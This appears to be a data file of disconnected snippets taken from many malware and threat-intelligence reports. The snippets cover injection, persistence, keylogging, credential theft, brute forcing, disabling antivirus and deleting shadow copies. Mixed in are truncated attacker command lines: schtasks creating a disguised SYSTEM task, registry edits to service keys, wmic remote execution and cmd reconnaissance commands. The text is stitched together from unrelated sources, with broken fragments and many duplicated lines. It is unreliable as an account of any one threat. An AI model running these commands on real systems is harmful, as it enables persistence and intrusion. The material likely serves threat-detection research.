This includes bidirectional file transfers between the C&amp;C and the compromised machine.
This configuration corresponds to resource 1000 in the initial loader. It defines the address and port for both the exfiltration server (file_server) and the C&amp;C server
a given command line.
is protected with DNGuard, a commercial .NET packer.
uses both regular and reflective DLL injection.
proxy/tunneling utilities (HTran, LCX, EarthWorm
read from a file on disk or a registry key.
components use registry keys to signal each other.
it collects usernames
usernames
directory listings
directory listings were harvested as a result.
hostnames
machine names
execution using scheduled tasks
downloaded and run by the plaintext PY files from external infrastructure.
it download and execute yet another Python script
Code responsible for downloading cron_script file
keylogging functionality.
malware hidden inside the Python compiled byte code
malicious code is embedded in code
unpacking
Obfuscation is one of the most popular methods to achieve this.
JavaScript obfuscation was used
use of various obfuscation techniques in malware
the most popular obfuscation techniques is execution of Base64-encoded malicious code
use of W4SP crew obfuscation tools such as Hyperion and Kramer
The inspected UEFI firmware was tampered with to embed a malicious code that we dub MoonBounce;
be embedded in the loader itself.
that stages execution of further payloads downloaded from the internet
attempts to fetch another stage of the payload to run in memory,
stage the execution of additional plugins in memory,
Download a file from the C2 server
reaching out to the server to obtain a further payload.
the execution of several functions in the EFI Boot Services Table, namely AllocatePool, CreateEventEx and ExitBootServices
using the WinExec API
injecting it into an svchost.exe process,
injecting it to the address space of another process.
The injected process
an encrypted blob
the encrypted ScrambleCross shellcode
an encrypted configuration file
facilitates the functionality of WMI in Windows
when the WMI service was initiated
upon initiation of the WMI service
Usage of WMI for remote command execution
wmic  /node:&lt;
It works by decrypting a shellcode BLOB with AES-256
through the command line as
via a Windows batch script file
issuing the following command line
Write text to a given *.bat file and execute it
Run a shell command
examples of command lines
cmd /C
cmd /C
cmd /C
cmd /C
cmd /C
cmd /C
cmd /C
cmd /C
cmd /C
cmd /C
cmd /C
cmd /C
cmd /C
cmd /C
cmd /C
cmd /C
cmd /C
cmd /C
cmd /C
cmd /C
executing a launcher utility with the filename System.Mail.Service.dll (MD5: 5F9020983A61446A77AF1976247C443D) through the command line as a service.
reg  add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
reg  add "HKLM\SYSTEM\CurrentControlSet\Services\iscsiwmi\Parameters"
reg  add "HKLM\SYSTEM\CurrentControlSet\Services\iscsiwmi\Parameters" /
The second way to execute StealthMutant is through the creation of a scheduled task
schtasks /create /TN
schtasks /run
Both the IP and the server directory path are encrypted with AES-128 using a base64 encoded key stored in the backdoor’s image.
The commands retrieved from the server are also encrypted with AES-128
Get list of drives
Get content list from a specified directory
cmd /C "C: &amp; cd \ &amp; dir $temp\ /od"
Sending back the result of the command’s execution to the C2 server.
cmd /C "C: &amp; cd \ &amp; whoami"
cmd /C "C: &amp; cd \ &amp; tasklist"
cmd /C "C: &amp; cd \ &amp; systeminfo"
Copying of files across SMB shares
cmd /C "C: &amp; cd \ &amp; arp -a"
Removal of artefacts from the system
wmic  /node
wmic  /node
wmic  /node
wmic  /node
wmic  /node
wmic  /node
These were used to inject the payload into process memory.
Adds Run Registry Key for Persistence
The persistence technique is simply adding a run registry key for persistence
added to the startup folder
Screen capture
Screen Logger
Keylogging
Keylogger
Gathering system information
System Information
Encoded shellcode in Project File
contained encoded executables and shellcode,
LoadLibraryW, VirtualAlloc, CreateProccessW, and ZwUnmapViewOfSection.
LoadLibraryW loads the module, VirtualAlloc allocates the memory, CreateProcessW created a process, and ZwUnmapViewOfSection is used
using the callback function pointer in CallWindowProc
The payload from the project files was a remote access tool (RAT) called Remcos.
two large arrays of decimal bytes were decoded by the function
Decoding Function
decoding function
Remote Command Line
Registry Editor
stealing multiple types of data
the “UsingTask” element defines the task that will be compiled by MSBuild.
MSBuild has an inline task feature
Modify and query the Windows registry
query the Windows registry
Log keystrokes
Bypass UAC
Egress communications over HTTP, HTTPS
Take screenshots
Set up proxies
payloads are usually shellcode encrypted with a rolling XOR key.
Once the encoded payload has been located
the project file has an encoded and compressed payload
The use of shellcode, encoding, compression, obfuscated strings
since each payload will be encrypted with different keys and each configuration will uniquely change the hash value.
Encrypted payloads will also obfuscate useful strings from static analysis.
using multiple stages and encrypted/obfuscated payloads
the code can be injected into other legitimate running processes
The payload, usually shellcode, is injected into another process.
The shellcode is then executed in a new thread.
An endpoint with a system injected
process injection
and process injection
Inject malicious code into legitimate processes
is a memory-only DLL that runs as a service
that pulls the Cobalt Strike payload from a fake JPG file.
also leveraging steganography to locate the start of the encoded payload
It uses a different custom packer
the malware to unpack
, it extracts, decrypts, and decompresses the data to be executed as shellcode.
This payload is decrypted, decompressed, and then copied into memory
it is decrypted and executed
decode
domain fronting
or download additional stages.
drops and executes Cobalt Strike in the memory space of “rundll32.exe.”
This requires either social engineering tactics to get the target to execute the malware or another program/script to execute the file.
To optimize brute forcing efforts, the malware compares the server prompt upon connection to a hardcoded list of strings
These credentials used appear to be default credentials for IoT devices.
It attempts to specifically gain root access to these devices via a default password
Like the earlier SSH brute-forcing campaign
brute-forced devices
optimizing the brute forcing implementation
Code for the brute forcing implementation is significantly more structured
added to support the Telnet brute force.
Restart Telnet brute forcing
brute forcing
SSH brute forcing code with the more usual Telnet equivalent.
The Telnet brute forcing code is designed primarily for self-propagation
SSH brute-forcing campaign,
This allows it to download and deploy
are downloaded and executed in the victim's system
downloader to the compromised device that executes and downloads the primary payload.
then downloads its payload via software installed on the compromised device, such as ftpget, wget, curl, or tftp, before executing the payload.
It uses the cpuinfo Python module to retrieve information about the CPU.
This code checks if the disk size is greater than a specified threshold (50 GB as example).
uses the win32api.GetDiskFreeSpaceEx() function to retrieve the disk size in bytes
Reflective PE injection
Reflective PE injection is a technique used by malware or advanced attackers to inject a Portable Executable (PE) file directly into the memory of a running process without the need for writing the file to disk
reflective PE injection allows the malware to load and execute its code directly from memory
In reflective PE injection, the PE file is parsed and its sections are reconstructed in the target process’s memory.
-ReflectivePEInjection” that facilitates reflective PE injection using PowerShell.
This module allows the injection of a PE file into a remote or local process’s memory without writing it to disk
Once the PE file is injected and reconstructed in memory, the execution flow can be redirected to the injected code, enabling the malware to operate within the context of the compromised process.
PE reflective injection.
The PE file is downloaded on filesystem and than executed.
uses the DownloadFile method of the WebClient object to download the file from the specified URL and save it to the specified local file path.
the file to be downloaded.
script that downloads a file from a fixed location and executes it.
PowerShell one-liner that can be used to download and execute a remote .ps1 or .exe file:
using LNK files to download malware or other malicious files by leveraging legitimate native apps, such as PowerShell.
simple stager download of an .exe file and its execution.
This line uses the ShellExecute method of the Shell.Application object to execute the downloaded file.
The Shell.Application object provides methods for working with the Windows shell
decrypt
This decryption process utilizes the Fernet algorithm
The script will download and decrypt the string that represents the token
The fernet_decrypt function decrypts an encrypted string
It returns the decrypted message as a decoded string.
it use the harcoded password for decryption using the fernet_decrypt function, and returns the decrypted AUTH Token.
the file will be deleted
access to system APIs,
It uses the win32api.GetDiskFreeSpaceEx() function
Fernet is a symmetric encryption algorithm and token format used for secure communication and data protection
It utilizes symmetric key cryptography, where the same secret key is used for both encryption and decryption
this code comparing the local IP address with a predefined list of network addresses
obfuscation mechanisms during the compilation process.
the injected code
the local disk volumes to be encrypted are also configured in a similar manner.
In addition to file encryption and obfuscation,
(crawl whole tree), I:, H:, G:, F:, E:, and D:.
malware will attempt to gather specific, sensitive information from targeted systems.
the dropper is distributed in the form of a UPX-packed DLL
The malware then abuses the MSDTC service, manipulating the permissions and startup parameters.
its abuse of the legitimate MSDTC service,
malicious oci.dll into the service’s executable
its attempts to steal credentials and browser data.
This includes browser session and credential data.
Credential and Browser Data Theft
It checks that there are no running processes related to security-related software (e.g., Windbg, Autoruns, Wireshark)
It checks that there are no drivers loaded from security-related software (e.g., groundling32.sys)
It checks that the status of certain services belonging to security-related software meets certain conditions (e.g., windefend, sense, cavp)
Like the domain, the URI is composed using a set of hardcoded keywords and paths, which are chosen partly at random and partly based on the type of HTTP request that is being sent out.
DeleteFile
deleting files
ReadRegistryValue
GetRegistrySubKeyAndValueNames
enumerate files and registry keys
The content of the MachineGuid registry value from the key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
DeleteRegistryValue
SetRegistryValue
manipulating of registry keys
GetProcessByDescription
enumerate processes
The command CollectSystemDescription retrieves the following information:

Local Computer Domain name
Administrator Account SID
HostName
OS Version
The domain name of the device
Username
System Directory
To avoid detection, attackers renamed Windows administrative tools like adfind.exe which were then used for domain enumeration
schtasks /create /F /tn “\Microsoft\Windows\SoftwareProtectionPlatform\EventCacheManager” /tr “C:\Windows\SoftwareDistribution\EventCacheManager.exe” /sc ONSTART /ru system /
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
With Rundll32,
collect and upload information about the device
to report some basic information about the compromised system
the ability to log keystrokes
keystrokes
logs keystrokes
capture screenshots,
“The reconnaissance data is exfiltrated to the attacker-controlled server through an HTTP POST request
the attacker-controlled server through an HTTP POST request
send phishing emails with malicious HTML attachments
operating system information
collecting system information such as hostnames
OS version information
run the payloads by sideloading them to the legitimate executables
insights on anti-virus software present on the machine
downloading and executing two other PowerShell scripts from a different attacker-controlled server
IPv4 addresses
“The banking trojan targets the victim’s sensitive information
Once user credentials have been compromised, this tool takes “full control” of the account
“When a victim opens the HTML file attachment, an embedded URL is launched in the victim’s browser, redirecting to another malicious HTML file from an attacker-controlled AWS EC2 instance
Identify processes
Logged Processes
Identify processes related to backups, antivirus/anti-spyware,
actors have also gained initial access to victim networks by distributing phishing emails with malicious attachments
by exploiting the following vulnerabilities against Microsoft Exchange servers
removes virus definitions and disables all portions of Windows Defender and other common antivirus programs in the system registry
Microsoft Windows Defender AntiVirus Protection disabled
Microsoft Windows Defender AntiSpyware Protection disabled
Microsoft Exchange Server Privilege Escalation Vulnerability
remove all existing shadow copies via vssadmin on command line
This could cause the file to run when double-clicked instead of opening it with a PDF viewer.
and then downloads a second-stage backdoor from the OpenDrive cloud service.
The decryption routine shared between the BADCALL for Linux and targeted destructive malware for Windows from 2014
uses the same type of strong encryption – AES-GCM
creates a scheduled task on the system that provides persistence.
creates a scheduled task on the system that provides persistence.
creates a scheduled task on the system that provides persistence.
establishes persistence by creating an autostart service that allows it to run whenever the machine boots.
establishes persistence by creating an autostart service that allows it to run whenever the machine boots.
decodes the configuration data and modules.
injects into the svchost.exe process.
injects into the svchost.exe process
malicious actors spread primarily by spearphishing campaigns using tailored emails that contain malicious attachments
has used an email with an Excel sheet containing a malicious macro to deploy the malware.
compromised server that prompts the victim to click
In clicking the photo, the victim unknowingly downloads a malicious JavaScript file that
has attempted to get users to launch malicious documents to deliver its payload.
spread the malware laterally across a network by abusing the Server Message Block (SMB) Protocol.
modules spread the malware laterally across a network by abusing the SMB Protocol.
data exfiltration over a hardcoded C2 server
can send information about the compromised host to a hardcoded C2 server.
uses the Windows Application Programming Interface (API) call, CreateProcessW(), to manage execution flow.
by capturing the CredEnumerateA API.
by capturing the CredEnumerateA API.
leveraging Microsoft’s CryptoAPI
uses an AES CBC (256 bits) encryption algorithm for its loader and configuration files.
leverages a custom packer to obfuscate its functionality.
can modify registry entries
can disable Windows Defender.
can obtain passwords stored in files from several applications such as Outlook, Filezilla, OpenSSH, OpenVPN and WinSCP.
it searches for the .vnc.lnk affix to steal VNC credentials.
can obtain passwords stored in files
by querying the Software\SimonTatham\Putty\Sessions registry key.
obtains the IP address, location, and other relevant network information from the victim’s machine.
can identify the user and groups the user belongs to on a compromised host.
gathers the OS version, machine name, CPU type, amount of RAM available from the victim’s machine
searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip.
collects local files and information from the victim’s local machine.
uses HTTPS to communicate with its C2 servers
samples have used HTTP over ports 447 and 8082 for C2.
downloads several additional files and saves them to the victim's machine.
uses a custom crypter leveraging Microsoft’s CryptoAPI to encrypt C2 traffic.
